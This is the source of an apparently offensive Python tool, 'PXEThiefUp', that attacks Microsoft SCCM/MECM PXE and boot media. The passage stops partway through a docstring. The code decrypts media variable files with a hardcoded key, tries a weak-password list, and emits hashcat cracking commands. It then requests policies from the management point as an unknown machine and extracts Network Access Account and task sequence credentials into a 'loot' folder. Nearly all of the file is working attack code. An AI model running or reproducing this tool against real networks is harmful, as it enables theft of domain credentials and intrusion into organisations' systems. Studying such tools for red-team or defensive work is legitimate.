#!/usr/bin/env python3
# PXEThiefUp

import argparse
import binascii
import ipaddress
import socket
import configparser
import lxml.etree as ET
import math
import requests
import zlib
import datetime as dt
import os

# Blurbdust
from certipy.lib.certificate import load_pfx
from sccmwtf import CryptoTools, dateFormat1
from cryptography.hazmat.primitives.asymmetric import padding
import tftpy
from asn1crypto import cms

import media_variable_file_cryptography as media_crypto
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives import hashes

import pycdlib as pycd
from os import walk
from requests_toolbelt import MultipartEncoder,MultipartDecoder
from scapy.all import *
from ipaddress import IPv4Network,IPv4Address
from rich import print
from rich.table import Table
from rich.console import Console

# Scapy global variables
clientIPAddress = ""
clientMacAddress = ""

# HTTP Configuration Options
# Configure proxying for debugging support
USING_PROXY = False 

# HTTPS and client certificate support
USING_TLS = False 
CERT_FILE = "output.crt"
KEY_FILE = "output-key.key"

# MECM Task Sequence Config Options
# The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed
SCCM_BASE_URL = ""

# Debug Config Options
DUMP_MPKEYINFORMATIONMEDIA_XML = True
DUMP_REPLYASSIGNMENTS_XML = True
DUMP_POLICIES = True

# SMS Variables
SMS_MEDIA_GUID = ""
SMS_TS_MEDIA_PFX = ""
BRANDING_TITLE = ""
SITECODE = ""
STANDALONE_MEDIA = ""
SMS_MEDIA_PFX = ""
SMS_MEDIA_GUID = ""

# Global Variables
BLANK_PASSWORDS_FOUND = False
MEDIATYPE = ""
PASSWORDREQUIRED = ""
UNATTENDED = "" 
VERBOSE = False
base_url_override = None

WORKING_DIR = "loot"

## Crypto Functions
## ------------------
def generateSignedData(data, cryptoProv):
    # SHA1 hash algorithm
    sha1hash = cryptoProv.CryptCreateHash(32772, None)
    sha1hash.CryptHashData(data)

    # Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha1hash.CryptSignHash(1,1)
    return binascii.hexlify(out).decode()

def generateSignedDataLinux(data, key):
    signature = key.sign(data, PKCS1v15(), hashes.SHA1())
    signature_rev = bytearray(signature)
    signature_rev.reverse()
    return bytes(signature_rev)

def generateClientTokenSignature(data, cryptoProv):
    # SHA256 hash algorithm
    sha256hash = cryptoProv.CryptCreateHash(32780, None)
    sha256hash.CryptHashData(data)

    # Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha256hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def CryptDecryptMessage(pfx, data):
    info = cms.ContentInfo.load(data)
    digested_data = info['content']
    key_algo = digested_data['recipient_infos'].native[0]['key_encryption_algorithm']['algorithm']
    key = b""
    if key_algo == 'rsaes_pkcs1v15':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        key = pfx.decrypt(session_key, padding.PKCS1v15())
    elif key_algo == 'rsaes_oaep':
        session_key = digested_data['recipient_infos'].native[0]['encrypted_key']
        pad = padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None)
        key = pfx.decrypt(session_key, pad)
    else:
        print(f"{key_algo} not implemented yet")
    iv = digested_data['encrypted_content_info']['content_encryption_algorithm']['parameters'].native
    ciphertext = digested_data['encrypted_content_info']['encrypted_content'].native
    decrypted_data = b""
    enc_algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
    if enc_algo == 'tripledes_3key':
        #algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
        #print(f"{algo} not implemented yet")
        decrypted_data = media_crypto._3des_decrypt_raw(ciphertext, key, iv)
    elif enc_algo == 'aes256_cbc':
        decrypted_data = media_crypto.aes256_decrypt_raw(ciphertext, key, iv)
    else:
        print(f"{enc_algo} not implemented yet")
    return decrypted_data

def decrypt_file(path, password):
    # Decrypt encryted file type using the password provided
    # password must be already encoded to utf-16-le
    global PASSWORD
    encrypted_file = media_crypto.read_media_variable_file(path)
    try:
        key = media_crypto.aes_des_key_derivation(password)
        last_16 = math.floor(len(encrypted_file)/16)*16
        decrypted_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
        decrypted_file =  decrypted_file[:decrypted_file.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_file if c.isprintable())
        return True, wf_decrypted_ts
    except:
        return False, None

def decrypt_media_file(path, password):
    # print(f"{password} {path}")
    password_is_string = True
    if type(password) != str:
        password_is_string = False

    if (VERBOSE):
        print_nice("Media variables file to decrypt: " + path, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_media_file = decrypt_file(path, formatted_password)
    if (response == True):
        if (VERBOSE):
            print_nice("Successfully decrypted media variables file", "SUCCESS")
        return decrypt_media_file
    else:
        print_nice("Failed to decrypt media variables file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")
        print_nice("Generating hash for cracking", "INFO")
        generate_hashcat_output(path)
        return None

def decrypt_policy_file(path, password):
    password_is_string = True
    if type(password) != str:
        password_is_string = False
    
    if (VERBOSE):
        print_nice("Policy file to decrypt: " + path, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_policy_file = decrypt_file(path, formatted_password)
    if (response == True):
        if (VERBOSE):
            print_nice("Successfully Decrypted Policy file", "SUCCESS")
        return decrypt_policy_file
    else:
        print_nice("Failed to decrypt Policy file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")

def deobfuscate_credential_string(credential_string):
    #print(credential_string)
    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])

    key = media_crypto.aes_des_key_derivation(key_data)
    last_16 = math.floor(len(encrypted_data)/8)*8
    return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])

def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
    #ProxyDHCP Option 243
    length = encrypted_key[0]

    # Pull out 48 bytes that relate to the encrypted bytes in the DHCP response
    encrypted_bytes = encrypted_key[1:1+length]
    
    # Isolate encrypted data bytes
    encrypted_bytes = encrypted_bytes[20:-12] 

    # Harcoded in tspxe.dll
    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' 

    # Derive key to decrypt key bytes in the DHCP response
    key = media_crypto.aes_des_key_derivation(key_data) 

    # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 

    # Perform bit extension to help with key 
    LEADING_BIT_MASK =  b'\x80'
    new_key = bytearray()
    for byte in struct.unpack('10c',var_file_key):
        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
            new_key = new_key + byte + b'\xFF'
        else:
            new_key = new_key + byte + b'\x00'

    media_variables = decrypt_media_file(media_file_path, new_key)
    return media_variables

## File I/O Functions
## ------------------
def write_to_file(path, filename, contents, type="xml"):
    #print(path)
    #print(filename)
    #print((f"Writing file to {os.path.join(path, filename)}", "INFO"))
    # Check for file path existence
    if not os.path.exists(path):
        os.makedirs(path)
    if type == "xml":
        filename = filename + ".xml"
        f = open(os.path.join(path, filename), "w")
    elif type == "binary":
        f = open(os.path.join(path, filename), "wb")
    else:
        filename = filename + "." + type
        f = open(os.path.join(path, filename), "w")
    f.write(contents)
    f.close()

def copy_file_to_dir(file_path:str, target_dir:str, delete_original:bool = False):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    filename = os.path.basename(file_path)
    target_path = os.path.join(target_dir, filename)
    
    # Check if the file exists already, and just return it if it exists, catches an ISO issue for temp files
    if (os.path.exists(target_path)):
        return target_path
    shutil.copy2(file_path, target_path)
    if delete_original:
        os.remove(file_path)
    return target_path

def scan_for_files(path):
    f = []
    variables_file = None
    policy_file = None

    for (dirpath, dirnames, filenames) in walk(path):
        f.extend(filenames)
        break

    for file in f:
        if file.endswith(".iso"):
            print_nice(f"Found ISO file: {file}", "INFO")
            variables, policy, password, variables_loot_path, policy_loot_path = search_through_iso((os.path.abspath(os.path.join(path, file))))
            if (variables and policy):
                #print("[+] Found both variables and policy files in the ISO")
                return variables_loot_path, policy_loot_path
            elif (variables):
                #print("[+] Found variables file in the ISO")
                return variables_loot_path, policy_file
    
    for file in f:
        #print(file)
        if file.endswith(".dat"):
            if "variables" in file.lower():
                variables_file = os.path.abspath(os.path.join(path, file))
        if file.endswith(".var"):
            if "variables" in file.lower():
                variables_file = os.path.abspath(os.path.join(path, file))
            # Detection for boot.var files
            elif (file.split(".")[-2].lower() == "boot"):
                variables_file = os.path.abspath(os.path.join(path, file))
        if file.endswith(".xml"):
            if "policy" in file.lower():
                policy_file = os.path.abspath(os.path.join(path, file))

    return variables_file, policy_file

def search_through_iso(isoPath):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED

    variables = None
    policy = None
    password = None
    variables_loot_path = None
    policy_loot_path = None

    ISOLOOT = os.path.abspath(os.path.join(WORKING_DIR, ".temp_media_location"))
    if not os.path.exists(ISOLOOT):
        os.makedirs(ISOLOOT)

    # Hacky solution for windows and linux...
    isoName = isoPath.split("\\")[-1]
    isoName = isoName.split("/")[-1]
    
    abso_path = os.path.abspath(isoPath)
    #print(f"[+] Searching through ISO: {abso_path}")
    iso = pycd.PyCdlib()
    iso.open(abso_path)

    for dirname, dirlist, filelist in iso.walk(udf_path='/SMS/data'):
        #print(f"[+] Found files: {filelist}")
        variables_file = io.BytesIO()
        policy_file = io.BytesIO()
        bootstrap_file = io.BytesIO()
        policy_data = None
        variables_data = None
        bootstrap_data = None

        for file in filelist:
            if file.endswith(".ini"):
                if "bootstrap" in file.lower():
                    #print(f"[+] Found Bootstrap file")
                    iso.get_file_from_iso_fp(bootstrap_file, udf_path=('/SMS/data/' + file))
                    bootstrap_data = bootstrap_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, bootstrap_data, "binary")
            if file.endswith(".xml"):
                if "policy" in file.lower():
                    #print(f"[+] Found Policy file")
                    iso.get_file_from_iso_fp(policy_file, udf_path=('/SMS/data/' + file))
                    policy_data = policy_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, policy_data, "binary")
            if file.endswith(".dat"):
                if "variables" in file.lower():
                    pathForFile = '/SMS/data/' + file
                    #print(f"[+] Found Variables file")
                    iso.get_file_from_iso_fp(variables_file, udf_path=pathForFile)
                    variables_data = variables_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, variables_data, "binary")
                    
    iso_extracts = []
    for (dirpath, dirnames, filenames) in walk(ISOLOOT):
        iso_extracts.extend(filenames)
        break

    if (bootstrap_data is not None):
        for file in iso_extracts:
            if "bootstrap" in file.lower():
                #print("[+] Parsing TSMBootstrap.ini file for media information...")
                parse_bootstrap_ini((os.path.join(ISOLOOT, file)))
            elif "variables" in file.lower():
                #print("[+] Found Variables file in ISO")
                variables_loot_path = os.path.join(ISOLOOT, file)
            elif "policy" in file.lower():
                #print("[+] Found Policy file in ISO")
                policy_loot_path = os.path.join(ISOLOOT, file)
        

        if (MEDIATYPE == "FullMedia"):
            # Both Variables and Policy files are present
            policy = True
            variables = True
        else:
            # Only Variables
            variables = True
        
        if (PASSWORDREQUIRED == "false"):
            # Default Password in use
            password = False
        else:
            # Password is required
            password = True

    return variables, policy, password, variables_loot_path, policy_loot_path

def parse_bootstrap_ini(bootstrap_data):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED
    # Parse the TSMBootstrap.ini file
    config = configparser.ConfigParser()
    config.read(bootstrap_data)
    MEDIATYPE = (config['MediaInfo']['MediaType'])
    PASSWORDREQUIRED = (config['MediaInfo']['PasswordRequired'])
    UNATTENDED = (config['MediaInfo']['Unattended'])
    # Cleanup the folder 
    os.remove(bootstrap_data)

## Helper Function
## ------------------
def print_nice(data, type = "INFO"):
    if (type == "ERROR"):
        print("[red][!][red] " + data)
    elif (type == "INFO"):
        print("[yellow][?][yellow] " + data)
    elif (type == "SUCCESS"):
        print("[green][+][green] " + data)
    else:
        print("[*] " + data)

def list_network_interfaces():
    print_nice("Listing available network interfaces...", "INFO")

    # Get list of available interfaces
    interface2 = scapy.interfaces.get_working_ifaces()

    # Use a table to do the rest
    interface_table = Table(title="Available Network Interfaces")
    interface_table.add_column("Index", justify="center", no_wrap=True)
    interface_table.add_column("Name", justify="center", no_wrap=True)
    interface_table.add_column("Description", justify="center", no_wrap=True)
    interface_table.add_column("MAC Address", justify="center", no_wrap=True)
    interface_table.add_column("IP Address", justify="center", no_wrap=True)

    # Sort interfaces by index because I am a bit OCD about that
    interface2 = sorted(interface2, key=lambda x: x.index)

    for i in interface2:
        #print_nice(i, "INFO")
        if i.is_valid == False:
            continue
        else:
            flags = (i.flags)
            if "DISCONNECTED" in flags:
                continue
            else:
                interface_table.add_row(str(i.index), str(i.ip), str(i.mac), str(i.name), str(i.description))
                #print(i.index)
                #print(i.name)
                #print(i.description)
                #print(i.mac)
                #print(i.ip)
                #for flag in flags:
                #    print(flag)
                #print(i.flags)
    console = Console()
    console.print(interface_table)

def validate_ip_or_resolve_hostname(input):
    # Verify if the input has a leading protocol and strip it if so
    if (input.startswith("http://") or input.startswith("https://")):
        input = input.split("/")[2]
    try:
        # Try and see if the IP address is valid
        ipaddress.ip_address(input)
        ip_address = input
    except:
        try:
            # Try and resolve the Hostname on the network
            ip_address = socket.gethostbyname(input.strip())
        except:
            print_nice(input + " does not appear to be a valid hostname or address (or DNS does not resolve)", "ERROR")
            return None
    return ip_address

def generate_hashcat_output(input):
    hash = media_crypto.read_media_variable_file_header(input)
    print_nice(f"[yellow]Hash[white]: {hash}")
    print_nice(f"[yellow]Hashcat mode[white]: 19850 (requires https://github.com/The-Viper-One/hashcat-6.2.6-SCCM)")
    print_nice(f"[yellow]Command[white]: \nhashcat -m 19850 -a 0 '{hash}' '..\\rockyou(1).txt'")

def test_default_weak_passwords_on_media(path):
    blankPassword = ("{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}").encode("utf-16-le")
    passwords = {
        "1234",
        "123456",
        "12345678",
        "123456789",
        "password",
        "password1",
        "password123",
        "admin",
        "administrator",
        "root",
        "letmein",
        "qwerty",
        "abc123",
        "welcome",
        "Welcome1",
        "god",
        "love",
        "P@ssw0rd",
        "P@ssword",
        "P@ssw0rd1",
        "P@ssword1",
    }

    if (VERBOSE):
        print_nice("Media variables file to decrypt: " + path, "INFO")

    response, decrypt_media_file = decrypt_file(path, blankPassword)
    if (response == True):
        print_nice("Successfully decrypted media variables file with default password", "SUCCESS")
        #write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
        return True, decrypt_media_file, blankPassword

    for password in passwords:
        response, decrypt_media_file = decrypt_file(path, password)
        if (response == True):
            print_nice(f"Successfully decrypted media variables file with password: {password}", "SUCCESS")
            #write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
            return True, decrypt_media_file, password

    print_nice("Failed to decrypt media variables file with blank or default passwords", "ERROR")
    generate_hashcat_output(path)
    return False, None, None

## Networking
## ------------------
def configure_scapy_networking(ip_address, interface=None):
    # If user has provided a target IP address, use it to determine interface to send traffic out of
    if ip_address is not None:
        ip_address = validate_ip_or_resolve_hostname(ip_address)
        if ip_address is None:
            print_nice("Unable to resolve provided target IP address or hostname", "ERROR")
        else:

            route_info = conf.route.route(ip_address,verbose=0)
            interface_ip = route_info[1]

            if interface_ip != "0.0.0.0":
                conf.iface = route_info[0]
            else:
                print_nice(f"No route found to target host {ip_address}", "ERROR")
                return
    if interface is not None:
        print_nice(f"Attemting to use Interface ID {str(interface)}")
        conf.iface = conf.ifaces.dev_from_index(interface)
    else:
        #Automatically attempt sane interface configuration
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        scapy_config = config["SCAPY SETTINGS"]
        
        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
            except:
                print_nice("Invalid value set for 'manual_interface_selection_by_id' in 'settings.ini' file. Please specify an integer associated with the desired interface, or leave the field blank for automatic interface selection", "ERROR")
                return
        else:
            manual_selection_mode_id = None

        if manual_selection_mode_id:
            print_nice(f"Attemting to use Interface ID {str(manual_selection_mode_id)} provided in setttings.ini")
            conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
        else:
            print_nice("Attemting automatic interface detection")
            selection_mode = scapy_config.getint("automatic_interface_selection_mode")
            # 1 - Use interface that can reach default GW as output interface, 2 - First interface with no autoconfigure or localhost IP address 
            try_next_mode = False
            if selection_mode == 1:

                default_gw = conf.route.route("0.0.0.0",verbose=0)
                default_gw_ip = conf.route.route("0.0.0.0",verbose=0)[2]
                
                #If there is a default gw found, set scapy to use that interface
                if default_gw_ip != '0.0.0.0':
                    conf.iface = default_gw[0]
                else: 
                    try_next_mode = True

            if selection_mode == 2 or try_next_mode:

                loopback_range = IPv4Network('127.0.0.0/8')
                autoconfigure_ranges = IPv4Network('169.254.0.0/16')

                interfaces = scapy.interfaces.get_working_ifaces()
                for interface in interfaces:
                    
                    #Read IP from interface
                    ip =  get_if_raw_addr(interface)    
                    if ip:
                        ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                    else: 
                        continue

                    #If it is a valid IP and is not a loopback or autoconfigure IP, use this interface
                    if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                        conf.iface = interface
                        break
                    
                #Implement check on conf.iface value
    
    global clientIPAddress
    global clientMacAddress

    clientIPAddress = get_if_addr(conf.iface)
    clientMacAddress = get_if_hwaddr(conf.iface)

    bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
    bind_layers(UDP,BOOTP,dport=68,sport=4011)
    print_nice(f"Using interface: [white]{conf.iface} - {conf.iface.description}")

## HTTP Functions
## ------------------
def decrypt_http_cert_response_data(key, message, data=False):
    if USING_TLS or data:
        out = message.content.decode("utf-16-le")
    else:
        dstr = CryptDecryptMessage(key, message.content)
        dstr = dstr.decode("utf-16-le")
        out = "".join(c for c in dstr if c.isprintable())
    return out

def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature, key):
    # Retrieve all available Task sequences, NAA config and any identified collection settings and return to parsing function

    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # print("[+] Retrieving Needed Metadata from SCCM Server...")
    if (VERBOSE):
        print_nice("Target Management Point URL: " + SCCM_BASE_URL, "INFO")
    session = requests.Session()

    if USING_TLS:
        session.verify = False
        session.cert = (CERT_FILE,KEY_FILE)
        #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
    if USING_PROXY:
        proxies = {"https":'127.0.0.1:8080'}
        session.proxies = proxies
    
    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # Retrieve the Unknown x64 version of the BCD from the management endpoint
    if (VERBOSE):
        print_nice("[+] Retrieving x64UnknownMachineGUID from MECM MP", "INFO")

    r = session.get(SCCM_BASE_URL + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
    if (r.status_code != 200):
        print_nice("Failed to retrieve MPKEYINFORMATIONMEDIA from Management Point. Status Code: " + str(r.status_code), "ERROR")
        return
    print(r)

    # Parse XML and retrieve x64UnknownMachineGUID
    root = ET.fromstring(r.text)
    clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
    clientID = root.find("UnknownMachines").get("x86UnknownMachineGUID")
    sitecode = root.find("SITECODE").text


    if DUMP_MPKEYINFORMATIONMEDIA_XML:
        # Write ManagementPointKeyInformationMedia XML data to the folder
        write_to_file(WORKING_DIR, "MPKEYINFORMATIONMEDIA", r.text, "xml")

    # Add UTF-16-LE Byte Order Mark (BOM)
    first_payload = b'\xFF\xFE' + (
        '<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature +'\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>'
    ).encode("utf-16-le")
    
    second_payload = (
        '<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n'
    ).encode("utf-16-le") + b'\x00\x00\x00'

    # Send a Message containing our Client ID and our valid token 
    me = MultipartEncoder(fields={
        'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 
        'RequestAssignments': second_payload}
    )
    
    # Send request for the policy assignment 
    if (VERBOSE):
        print_nice("Requesting policy assignments from MP", "INFO")

    r = session.request("CCM_POST",SCCM_BASE_URL + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data","mixed")})
    multipart_data = MultipartDecoder.from_response(r)

    # Get the zlib compressed policy locations and parse out the URLs for NAAConfig and TaskSequence
    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
    wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

    if DUMP_REPLYASSIGNMENTS_XML:
        # Unsure why this is here, but should come back to
        write_to_file(WORKING_DIR, "ReplyAssignments", wf_policy_xml, "xml")

    #Pull relevant configs from RequestAssignments XML
    allPoliciesURLs = {}

    root = ET.fromstring(wf_policy_xml)
    policyAssignments = root.findall("PolicyAssignment")
    dedup = 0

    for policyAssignment in policyAssignments:
        policies = policyAssignment.findall("Policy")
        for policy in policies:
            if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",SCCM_BASE_URL) 
                    dedup = dedup + 1

    # Print all policy assignment URLs
    print_nice(f"{len(allPoliciesURLs)} policy assignment URLs found!", "INFO")

    # Header Data for requesting future HTTP Policies
    #headers = {
    #    'CCMClientID': CCMClientID, 
    #    "CCMClientIDSignature" : CCMClientIDSignature, 
    #    "CCMClientTimestamp" : CCMClientTimestamp, 
    #    "CCMClientTimestampSignature" : CCMClientTimestampSignature
    #}

    now = dt.datetime.now(dt.UTC)
    headers = {"Connection": "close","User-Agent": "ConfigMgr Messaging HTTP Sender"}
    headers["ClientToken"] = "{};{}".format(
            CCMClientID.upper(),
            now.strftime(dateFormat1)
          )
    headers["ClientTokenSignature"] = CryptoTools.signNoHash(key, "{};{}".format(CCMClientID.upper(), now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()


    if DUMP_POLICIES:
        POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")

        policy_folder = WORKING_DIR + "/" + POLICY_FOLDER_PREFIX + "_policies/"
        os.mkdir(policy_folder)
        for category, url in allPoliciesURLs.items():
            if category is not None:
                # Send a request for the policies
                if (VERBOSE):
                    print_nice(f"Requesting {category} from: {url}", "INFO")

                content = session.get(url, headers=headers)
                write_to_file(policy_folder, category, content.content, "xml")


    # Make requests for all relevant policies
    colsettings = []
    naaconfig = []
    tsconfig = []
    for category, url in allPoliciesURLs.items():
        if "NAAConfig" in category:
            # Append request for Network Access Account configuration
            if (VERBOSE):
                print_nice(f"Requesting Network Access Account Configuration from: {url}", "INFO")
            naaconfig.append(session.get(url, headers=headers))

        if "TaskSequence" in category:
            # Append request for Task Sequence Configuration
            if (VERBOSE):
                print_nice(f"Requesting Task Sequence Configuration from: {url}", "INFO")
            tsconfig.append(session.get(url, headers=headers))

        if "CollectionSettings" in category:
            # Append request for Collections Settings
            if (VERBOSE):
                print_nice(f"Requesting Collection Settings from: {url}", "INFO")
            colsettings.append(session.get(url, headers=headers))

    # Decrypt the returned policies
    if (VERBOSE):
        print_nice("Decrypting retrieved policies", "INFO")

    if naaconfig is not None and len(naaconfig) > 0:
        naaconfig_decrypted = []
        for i in naaconfig:
            out = decrypt_http_cert_response_data(key, i)
            out2 = "".join(c for c in out if c.isprintable())
            naaconfig_decrypted.append(out2)
        naaconfig = naaconfig_decrypted
    
    if tsconfig is not None and len(tsconfig) > 0:
        tsconfig_decrypted = []
        for i in tsconfig:
            out = decrypt_http_cert_response_data(key, i)
            out2 = "".join(c for c in out if c.isprintable())
            tsconfig_decrypted.append(out2)
        tsconfig = tsconfig_decrypted

    if colsettings is not None and len(colsettings) > 0:
        colsettings_decrypted = []
        for colsetting in colsettings:
            data = False
            try:
                data = colsetting.content.decode("utf-16-le")
                data = True
            except (UnicodeDecodeError, AttributeError):
                pass

            wf_dstr = decrypt_http_cert_response_data(key, colsetting, data)

            # Decrypt and Decompress the data
            root = ET.fromstring(wf_dstr)
            dstr = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
            out = "".join(c for c in dstr if c.isprintable()) 
            colsettings_decrypted.append(out)
        colsettings = colsettings_decrypted

    return naaconfig, tsconfig, colsettings

## Parsing
## ------------------
class credential_processing_result:
    def __init__(self):
        self.naa_xml = None
        self.ts_xml = None
        self.collection_settings_xml = None

        self.naa_credentials = []
        self.ts_credentials = []
        self.collection_settings_credentials = []

    def _load_xml(self, xml, type):
        if type == "naa":
            self.naa_xml = xml
        elif type == "task_sequence":
            self.ts_xml = xml
        elif type == "collection_settings":
            self.collection_settings_xml = xml

    def process_xml(self, xml, type):
        self._load_xml(xml, type)

        if type == "naa":
            self._process_naa_xml()
        elif type == "task_sequence":
            self._decrypt_task_sequence_xml(xml)
        elif type == "collection_settings":
            self._process_collection_settings_xml()

    # Network Access Accounts
    def _process_naa_xml(self):
        if (VERBOSE):
            print_nice("Extracting Network Access Accounts", "INFO")
        root = ET.fromstring(self.naa_xml[:self.naa_xml.rfind('>')+1])
        network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")

        # Add a catch for if there are no NAAs
        for naa_settings in network_access_account_xml:
            network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
            network_access_username = network_access_username[:network_access_username.rfind('\x00')]
            network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
            network_access_password = network_access_password[:network_access_password.rfind('\x00')]

            naa_credential_pair = network_access_username, network_access_password
            self.naa_credentials.append(naa_credential_pair)
            #if (VERBOSE):
                #print_nice("Network Access Account Credentials found!", "INFO")

        #if (len(self.naa_credentials) == 0):
        #    if (VERBOSE):
        #        print_nice("No Network Access Account Credentials found!", "ERROR")

    # Task Sequences
    def _decrypt_task_sequence_xml(self, ts_xml):
        root = ET.fromstring(ts_xml[:ts_xml.rfind('>')+1])

        # Find all pkgnames
        ts_sequences = root.xpath("//*[@name='TS_Sequence']/value")

        for i in range(len(ts_sequences)):
            # Find all task sequences
            pkg_name = root.xpath("//*[@name='PKG_Name']/value")[i].text 
            adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[i].text
            ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[i].text
            tsName = pkg_name + "-" + adv_id
            keepcharacters = (' ','.','_', '-')
            tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()

            if ts_sequence_tag[:9] == "<sequence":
                tsSequence = ts_sequence_tag
            else:
                # Normal Task Sequence
                try:
                    # Attempt to decrypt the credential string
                    tsSequence = deobfuscate_credential_string(ts_sequence_tag)
                    print_nice(f"[!] Successfully Decrypted TS_Sequence XML Blob in Task Sequence '{pkg_name}'!", "SUCCESS")
                except:
                    # If failed, though I have not seen this before
                    print_nice(f"Failed to decrypt TS_Sequence in '{pkg_name}'. ", "ERROR")
                    return

            tsSequence = tsSequence[:tsSequence.rfind(">")+1]
            tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()

            print_nice("Writing decrypted 'TaskSequence_policy_" + tsName + ".xml'", "INFO")
            write_to_file(WORKING_DIR + "/policies", "TaskSequence_policy_" + tsName, tsSequence, "xml")

            if (VERBOSE):
                print_nice(f"Attempting to automatically identify credentials in Task Sequence: '{pkg_name}'", "INFO")
            self._analyse_task_sequence_for_potential_creds(tsSequence)

    def _analyse_task_sequence_for_potential_creds(self, ts_xml):
        """Known tags: 
            property="DomainPassword" name="OSDJoinPassword", 
            property="DomainUsername" name="OSDJoinAccount", 
            property="AdminPassword" name="OSDLocalAdminPassword", 
            property="RegisteredUserName" name="OSDRegisteredUserName", 
            property="CapturePassword" name="OSDCaptureAccountPassword", 
            property="CaptureUsername" name="OSDCaptureAccount"
